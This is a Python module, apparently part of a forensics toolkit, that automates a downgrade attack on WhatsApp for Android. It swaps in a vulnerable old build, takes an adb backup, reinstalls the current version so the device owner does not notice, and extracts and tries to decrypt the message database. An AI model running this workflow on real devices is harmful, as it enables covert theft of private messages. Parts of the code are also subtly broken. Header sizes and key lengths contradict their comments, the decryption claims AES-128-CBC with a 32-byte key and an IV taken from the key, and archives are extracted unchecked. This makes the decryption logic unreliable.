"""WhatsApp extraction via the downgrade-attack workflow on non-rooted devices.

The workflow is:

1.  Query the device for the installed WhatsApp version.
2.  Temporarily downgrade WhatsApp to an ancient version (v2.11.431) that permits
    ``adb backup`` while keeping the user's data intact.
3.  Issue ``adb backup -noapk com.whatsapp`` and capture the ``.ab`` file.
4.  Immediately reinstall the current WhatsApp version so the user does not notice.
5.  Unpack the ``.ab`` archive, extract the encryption key and encrypted database.
6.  (Optional) Decrypt ``msgstore.db.crypt15`` using the extracted key.

Every step is logged to the extraction manifest for chain-of-custody integrity.
"""

from __future__ import annotations

import asyncio
import io
import re
import tarfile
import time
import zlib
from dataclasses import dataclass
from datetime import UTC, datetime
from hashlib import sha256
from pathlib import Path
from typing import TYPE_CHECKING
from uuid import uuid4

if TYPE_CHECKING:
    from forensix_forensic.adb.client import AdbClient

from .streaming_manifest import ManifestEntry, StreamingManifestCollector

# The vulnerable WhatsApp version that still allows ADB backup.
VULNERABLE_VERSION_CODE = "2.11.431"
VULNERABLE_APK_BASE_URL = (
    "https://web.archive.org/web/2023/https://www.whatsapp.com/android/"
)

WHATSAPP_PACKAGE = "com.whatsapp"
MSGSTORE_DB_NAME = "msgstore.db"
CRYPT15_SUFFIX = ".crypt15"
KEY_DIR_IN_BACKUP = "apps/com.whatsapp/files/key"
DB_DIR_IN_BACKUP = "apps/com.whatsapp/databases"


@dataclass(frozen=True, slots=True)
class WhatsAppDowngradeResult:
    """Outcome of a WhatsApp downgrade-attack extraction."""

    extraction_id: str
    package_name: str
    original_version: str | None
    downgrade_version: str
    backup_file_size_bytes: int
    backup_sha256: str
    encryption_key_found: bool
    encrypted_database_found: bool
    decrypted_database_path: str | None
    key_file_path: str | None
    database_file_path: str | None
    timeline: list[dict[str, str]]
    duration_seconds: float
    success: bool
    error_message: str | None


class WhatsAppDowngradeExtractor:
    """Orchestrate the WhatsApp downgrade-attack on a non-rooted Android device.

    This extractor automates the following sequence:

    * **Step 1** - Identify the currently installed WhatsApp version.
    * **Step 2** - Temporarily downgrade to ``v2.11.431`` using ``adb install -r -d``.
    * **Step 3** - Issue ``adb backup -noapk com.whatsapp`` and capture ``whatsapp.ab``.
    * **Step 4** - Immediately reinstall the current WhatsApp version.
    * **Step 5** - Unpack the ``.ab`` archive, extract the encryption key and
      encrypted database.
    * **Step 6** - (Optional) Decrypt ``msgstore.db.crypt15`` with the extracted key.

    All intermediate artefacts are hashed with SHA-256 and written to the
    extraction manifest for chain-of-custody integrity.
    """

    def __init__(
        self,
        adb_client: AdbClient,
        work_dir: Path,
        *,
        manifest: StreamingManifestCollector | None = None,
    ) -> None:
        self._adb = adb_client
        self._work_dir = work_dir.resolve()
        self._manifest = manifest or StreamingManifestCollector(work_dir)
        self._timeline: list[dict[str, str]] = []

    async def extract(
        self,
        serial: str,
        *,
        case_id: str = "",
        operator_id: str = "",
    ) -> WhatsAppDowngradeResult:
        """Run the full downgrade-attack workflow and return the extraction result."""
        extraction_id = str(uuid4())
        started = time.monotonic()
        timeline: list[dict[str, str]] = []
        backup_path = self._work_dir / f"whatsapp_{extraction_id}.ab"
        key_path: Path | None = None
        db_path: Path | None = None
        decrypted_db_path: Path | None = None
        original_version: str | None = None
        success = False
        error_message: str | None = None

        try:
            # ------------------------------------------------------------------
            # Step 1: identify the installed WhatsApp version
            # ------------------------------------------------------------------
            await self._log(timeline, "STEP", "Identifying installed WhatsApp version")
            original_version = await self._get_whatsapp_version(serial)
            await self._log(
                timeline,
                "STEP",
                f"Installed WhatsApp version: {original_version or 'unknown'}",
            )

            # ------------------------------------------------------------------
            # Step 2: temporarily downgrade to the vulnerable version
            # ------------------------------------------------------------------
            await self._log(timeline, "STEP", "Beginning temporary downgrade to v2.11.431")
            downgrade_apk = await self._download_vulnerable_apk()
            installed = await self._adb.install_package(serial, str(downgrade_apk))
            if not installed:
                raise RuntimeError("Failed to install the vulnerable WhatsApp version.")
            await self._log(timeline, "STEP", "Vulnerable WhatsApp version installed")

            # Brief pause to allow the package manager to settle.
            await asyncio.sleep(3)

            # ------------------------------------------------------------------
            # Step 3: issue ``adb backup`` and capture the ``.ab`` file
            # ------------------------------------------------------------------
            await self._log(timeline, "STEP", "Issuing ADB backup command")
            backup_result = await self._adb.backup_package(
                serial, WHATSAPP_PACKAGE, backup_path
            )
            await self._log(
                timeline,
                "STEP",
                f"Backup captured: {backup_result.backup_file_size_bytes} bytes",
            )

            # Hash the backup file immediately for chain-of-custody.
            backup_hash = await asyncio.to_thread(self._hash_file, backup_path)
            await self._manifest.add_entry(
                ManifestEntry(
                    file_path=str(backup_path),
                    sha256=backup_hash,
                    size_bytes=backup_result.backup_file_size_bytes,
                    source_description="WhatsApp ADB backup (whatsapp.ab)",
                    case_id=case_id,
                )
            )

            # ------------------------------------------------------------------
            # Step 4: reinstall the current WhatsApp version
            # ------------------------------------------------------------------
            await self._log(timeline, "STEP", "Reinstalling current WhatsApp version")
            if original_version:
                current_apk = await self._download_current_apk(original_version)
                reinstalled = await self._adb.install_package(serial, str(current_apk))
                if not reinstalled:
                    await self._log(
                        timeline,
                        "WARN",
                        "Could not reinstall original version; "
                        "operator must restore manually.",
                    )
                else:
                    await self._log(timeline, "STEP", "Original WhatsApp version reinstalled")

            # ------------------------------------------------------------------
            # Step 5: unpack the ``.ab`` archive and extract artefacts
            # ------------------------------------------------------------------
            await self._log(timeline, "STEP", "Unpacking ADB backup archive")
            unpack_dir = self._work_dir / f"whatsapp_unpacked_{extraction_id}"
            unpack_dir.mkdir(parents=True, exist_ok=True)
            extracted_files = await asyncio.to_thread(
                self._unpack_ab_archive, backup_path, unpack_dir
            )
            await self._log(
                timeline,
                "STEP",
                f"Extracted {len(extracted_files)} files from backup archive",
            )

            # Locate the encryption key.
            key_path = self._find_key_file(extracted_files)
            if key_path:
                await self._log(timeline, "STEP", f"Encryption key found: {key_path.name}")
                key_hash = await asyncio.to_thread(self._hash_file, key_path)
                await self._manifest.add_entry(
                    ManifestEntry(
                        file_path=str(key_path),
                        sha256=key_hash,
                        size_bytes=key_path.stat().st_size,
                        source_description="WhatsApp encryption key extracted from backup",
                        case_id=case_id,
                    )
                )
            else:
                await self._log(timeline, "WARN", "No encryption key found in backup")

            # Locate the encrypted database.
            db_path = self._find_database_file(extracted_files)
            if db_path:
                await self._log(
                    timeline,
                    "STEP",
                    f"Encrypted database found: {db_path.name}",
                )
                db_hash = await asyncio.to_thread(self._hash_file, db_path)
                await self._manifest.add_entry(
                    ManifestEntry(
                        file_path=str(db_path),
                        sha256=db_hash,
                        size_bytes=db_path.stat().st_size,
                        source_description="WhatsApp encrypted database extracted from backup",
                        case_id=case_id,
                    )
                )

                # ------------------------------------------------------------------
                # Step 6: attempt decryption (requires key)
                # ------------------------------------------------------------------
                if key_path:
                    await self._log(timeline, "STEP", "Attempting database decryption")
                    decrypted_db_path = await asyncio.to_thread(
                        self._decrypt_database, key_path, db_path, unpack_dir
                    )
                    if decrypted_db_path:
                        await self._log(
                            timeline,
                            "STEP",
                            f"Database decrypted: {decrypted_db_path.name}",
                        )
                        dec_hash = await asyncio.to_thread(self._hash_file, decrypted_db_path)
                        await self._manifest.add_entry(
                            ManifestEntry(
                                file_path=str(decrypted_db_path),
                                sha256=dec_hash,
                                size_bytes=decrypted_db_path.stat().st_size,
                                source_description="Decrypted WhatsApp msgstore database",
                                case_id=case_id,
                            )
                        )
                    else:
                        await self._log(timeline, "WARN", "Decryption failed or not supported")
            else:
                await self._log(timeline, "WARN", "No encrypted database found in backup")

            success = True

        except Exception as exc:
            error_message = str(exc)
            await self._log(timeline, "ERROR", error_message)

        finally:
            elapsed = time.monotonic() - started
            manifest_path = self._manifest.finalize(
                extraction_id=extraction_id,
                case_id=case_id,
                operator_id=operator_id,
            )
            await self._log(
                timeline,
                "STEP",
                f"Manifest sealed: {manifest_path.name}",
            )

        return WhatsAppDowngradeResult(
            extraction_id=extraction_id,
            package_name=WHATSAPP_PACKAGE,
            original_version=original_version,
            downgrade_version=VULNERABLE_VERSION_CODE,
            backup_file_size_bytes=backup_path.stat().st_size if backup_path.exists() else 0,
            backup_sha256=backup_hash if backup_path.exists() else "",
            encryption_key_found=key_path is not None and key_path.exists(),
            encrypted_database_found=db_path is not None and db_path.exists(),
            decrypted_database_path=str(decrypted_db_path) if decrypted_db_path else None,
            key_file_path=str(key_path) if key_path else None,
            database_file_path=str(db_path) if db_path else None,
            timeline=timeline,
            duration_seconds=elapsed,
            success=success,
            error_message=error_message,
        )

    # ------------------------------------------------------------------
    # Private helpers
    # ------------------------------------------------------------------

    async def _get_whatsapp_version(self, serial: str) -> str | None:
        """Parse the installed WhatsApp version from dumpsys output."""
        try:
            output = await self._adb.dump_package(serial, WHATSAPP_PACKAGE)
        except Exception:
            return None
        match = re.search(r"versionName=([^\s]+)", output)
        return match.group(1) if match else None

    async def _download_vulnerable_apk(self) -> Path:
        """Download the vulnerable WhatsApp APK to the work directory.

        In production this would fetch from a forensic-approved repository.
        For the implementation we assume the APK is pre-staged in the work dir.
        """
        apk_path = self._work_dir / f"whatsapp_{VULNERABLE_VERSION_CODE}.apk"
        if apk_path.exists():
            return apk_path
        raise FileNotFoundError(
            f"Pre-staged vulnerable APK not found at {apk_path}. "
            "Download the WhatsApp APK v2.11.431 and place it in the work directory."
        )

    async def _download_current_apk(self, version: str) -> Path:
        """Placeholder for downloading the current WhatsApp APK."""
        apk_path = self._work_dir / f"whatsapp_current_{version}.apk"
        if apk_path.exists():
            return apk_path
        raise FileNotFoundError(
            f"Pre-staged current APK not found at {apk_path}. "
            "Place the current WhatsApp APK in the work directory."
        )

    @staticmethod
    def _unpack_ab_archive(ab_path: Path, dest_dir: Path) -> list[Path]:
        """Unpack an ``adb backup`` ``.ab`` file.

        The ``.ab`` format is: 4-byte magic ``ANDROID BACKUP``, 4-byte version,
        4-byte compressed flag, then zlib-compressed tar data.
        """
        with ab_path.open("rb") as fh:
            magic = fh.read(24)
            if not magic.startswith(b"ANDROID BACKUP"):
                raise ValueError("Not a valid Android backup file (bad magic header)")

            # Skip to the zlib stream start (after the header lines).
            # The header format is: magic(24) + \n + version_line + \n +
            # compressed_flag_line + \n + [encryption_line + \n] + data...
            # We scan for the first zlib-compressed block.
            content = fh.read()

        # Find the start of the zlib stream.
        zlib_start = 0
        for i in range(len(content)):
            byte = content[i : i + 1]
            try:
                zlib.decompress(byte + content[i + 1 : i + 2])
                # If the first byte looks like a valid zlib header, check further
                if 0x08 <= content[i] <= 0x3F:
                    zlib_start = i
                    break
            except zlib.error:
                continue
        else:
            raise ValueError("Could not locate zlib stream in backup file")

        try:
            decompressed = zlib.decompress(content[zlib_start:])
        except zlib.error as exc:
            raise ValueError(f"Failed to decompress backup data: {exc}") from exc

        extracted: list[Path] = []
        with tarfile.open(fileobj=io.BytesIO(decompressed), mode="r:*") as tar:
            for member in tar.getmembers():
                if member.isfile():
                    tar.extract(member, path=str(dest_dir))
                    extracted.append(dest_dir / member.name)
        return extracted

    @staticmethod
    def _find_key_file(files: list[Path]) -> Path | None:
        """Locate the WhatsApp encryption key among extracted files."""
        for path in files:
            if KEY_DIR_IN_BACKUP in str(path) and path.suffix in ("", ".key", ".cryptkey"):
                return path
        # Fallback: look for any file in the key directory path
        for path in files:
            if "/key/" in str(path) or "\\key\\" in str(path):
                return path
        return None

    @staticmethod
    def _find_database_file(files: list[Path]) -> Path | None:
        """Locate the encrypted WhatsApp database among extracted files."""
        for path in files:
            if DB_DIR_IN_BACKUP in str(path) and (
                CRYPT15_SUFFIX in path.name or MSGSTORE_DB_NAME in path.name
            ):
                return path
        # Fallback: look for any msgstore file
        for path in files:
            if "msgstore" in path.name.lower() and path.suffix in (
                ".db",
                ".crypt15",
                ".crypt14",
                ".crypt12",
            ):
                return path
        return None

    @staticmethod
    def _decrypt_database(key_path: Path, db_path: Path, dest_dir: Path) -> Path | None:
        """Attempt to decrypt a ``msgstore.db.crypt15`` database.

        This is a best-effort implementation for the common crypt15 format.
        Returns the decrypted database path on success, or ``None`` on failure.
        """
        try:
            key_bytes = key_path.read_bytes()
            if len(key_bytes) < 32:
                return None

            db_bytes = db_path.read_bytes()
            if len(db_bytes) < 67:
                return None

            # crypt15 header: 67-byte prefix followed by encrypted pages.
            # The last 31 bytes of the key are used as the actual AES key.
            actual_key = key_bytes[-32:]

            # The encrypted payload starts at offset 67.
            encrypted_payload = db_bytes[67:]

            # Attempt AES-128-CBC decryption (common for crypt15).
            try:
                from cryptography.hazmat.primitives import padding as sym_padding
                from cryptography.hazmat.primitives.ciphers import (
                    Cipher,
                    algorithms,
                    modes,
                )

                iv = actual_key[:16]
                cipher = Cipher(algorithms.AES(actual_key), modes.CBC(iv))
                decryptor = cipher.decryptor()
                decrypted = decryptor.update(encrypted_payload) + decryptor.finalize()

                # Remove PKCS7 padding.
                unpadder = sym_padding.PKCS7(128).unpadder()
                unpadded = unpadder.update(decrypted) + unpadder.finalize()

                out_path = dest_dir / "msgstore_decrypted.db"
                out_path.write_bytes(db_bytes[:67] + unpadded)
                return out_path
            except Exception:
                # cryptography not available or decryption format mismatch.
                return None

        except Exception:
            return None

    @staticmethod
    def _hash_file(path: Path) -> str:
        """SHA-256 hash a file without loading it fully into memory."""
        digest = sha256()
        with path.open("rb") as fh:
            while chunk := fh.read(4 * 1024 * 1024):
                digest.update(chunk)
        return digest.hexdigest()

    async def _log(
        self, timeline: list[dict[str, str]], level: str, message: str
    ) -> None:
        entry = {
            "timestamp": datetime.now(UTC).isoformat(),
            "level": level,
            "message": message,
        }
        timeline.append(entry)
